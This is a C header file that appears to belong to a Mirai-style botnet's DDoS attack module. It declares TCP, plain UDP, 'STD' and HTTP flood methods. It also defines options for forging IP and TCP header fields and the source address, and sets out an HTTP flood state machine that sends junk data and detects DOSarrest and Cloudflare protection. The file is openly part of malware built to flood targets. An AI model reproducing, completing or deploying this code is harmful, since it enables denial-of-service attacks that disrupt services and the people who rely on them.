#pragma once
#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include "includes.h"
#include "protocol.h"
#define ATTACK_CONCURRENT_MAX   1

struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};
struct attack_option {
    char *val;
    uint8_t key;
};
typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;
#define ATK_VEC_TCP        1
#define ATK_VEC_UDPPLAIN   2
#define ATK_VEC_STD        3
#define ATK_VEC_HTTP        4

#define HTTP_CONNECTION_MAX     256
#define ATK_OPT_PAYLOAD_SIZE    0   // What should the size of the packet data be?
#define ATK_OPT_PAYLOAD_RAND    1   // Should we randomize the packet data contents?
#define ATK_OPT_IP_TOS          2   // tos field in IP header
#define ATK_OPT_IP_IDENT        3   // ident field in IP header
#define ATK_OPT_IP_TTL          4   // ttl field in IP header
#define ATK_OPT_IP_DF           5   // Dont-Fragment bit set
#define ATK_OPT_SPORT           6   // Should we force a source port? (0 = random)
#define ATK_OPT_DPORT           7   // Should we force a dest port? (0 = random)
#define ATK_OPT_DOMAIN          8   // Domain name for DNS attack
#define ATK_OPT_DNS_HDR_ID      9   // Domain name header ID
#define ATK_OPT_URG             11  // TCP URG header flag
#define ATK_OPT_ACK             12  // TCP ACK header flag
#define ATK_OPT_PSH             13  // TCP PSH header flag
#define ATK_OPT_RST             14  // TCP RST header flag
#define ATK_OPT_SYN             15  // TCP SYN header flag
#define ATK_OPT_FIN             16  // TCP FIN header flag
#define ATK_OPT_SEQRND          17  // Should we force the sequence number? (TCP only)
#define ATK_OPT_ACKRND          18  // Should we force the ack number? (TCP only)
#define ATK_OPT_GRE_CONSTIP     19  // Should the encapsulated destination address be the same as the target?
#define ATK_OPT_METHOD			20	// Method for HTTP flood
#define ATK_OPT_POST_DATA		21	// Any data to be posted with HTTP flood
#define ATK_OPT_PATH            22  // The path for the HTTP flood
#define ATK_OPT_HTTPS           23  // Is this URL SSL/HTTPS?
#define ATK_OPT_CONNS           24  // Number of sockets to use
#define ATK_OPT_SOURCE          25  // Source IP
#define ATK_OPT_HOST            26
#define ATK_OPT_TIME            27
#define ATK_OPT_THREADS         28
#define ATK_OPT_LENGTH			29

#define HTTP_CONN_INIT          0 // Inital state
#define HTTP_CONN_RESTART       1 // Scheduled to restart connection next spin
#define HTTP_CONN_CONNECTING    2 // Waiting for it to connect
#define HTTP_CONN_HTTPS_STUFF   3 // Handle any needed HTTPS stuff such as negotiation
#define HTTP_CONN_SEND          4 // Sending HTTP request
#define HTTP_CONN_SEND_HEADERS  5 // Send HTTP headers 
#define HTTP_CONN_RECV_HEADER   6 // Get HTTP headers and check for things like location or cookies etc
#define HTTP_CONN_RECV_BODY     7 // Get HTTP body and check for cf iaua mode
#define HTTP_CONN_SEND_JUNK		8 // Send as much data as possible
#define HTTP_CONN_SNDBUF_WAIT   9 // Wait for socket to be available to be written to
#define HTTP_CONN_QUEUE_RESTART 10 // restart the connection/send new request BUT FIRST read any other available data.
#define HTTP_CONN_CLOSED        11 // Close connection and move on

#define HTTP_RDBUF_SIZE         1024
#define HTTP_HACK_DRAIN         64
#define HTTP_PATH_MAX           256
#define HTTP_DOMAIN_MAX         128
#define HTTP_COOKIE_MAX         5   // no more then 5 tracked cookies
#define HTTP_COOKIE_LEN_MAX     128 // max cookie len
#define HTTP_POST_MAX           512 // max post data len

#define HTTP_PROT_DOSARREST     1 // Server: DOSarrest
#define HTTP_PROT_CLOUDFLARE    2 // Server: cloudflare-nginx

struct attack_http_state {
    int fd;
    uint8_t state;
    int last_recv;
    int last_send;
    ipv4_t dst_addr;
    char user_agent[512];
    char path[HTTP_PATH_MAX + 1];
    char domain[HTTP_DOMAIN_MAX + 1];
    char postdata[HTTP_POST_MAX + 1];
    char method[9];
    char orig_method[9];

    int protection_type;

    int keepalive;
    int chunked;
    int content_length;

    int num_cookies;
    char cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX];

    int rdbuf_pos;
    char rdbuf[HTTP_RDBUF_SIZE];
};

struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};

BOOL attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
void attack_method_tcp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpplain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
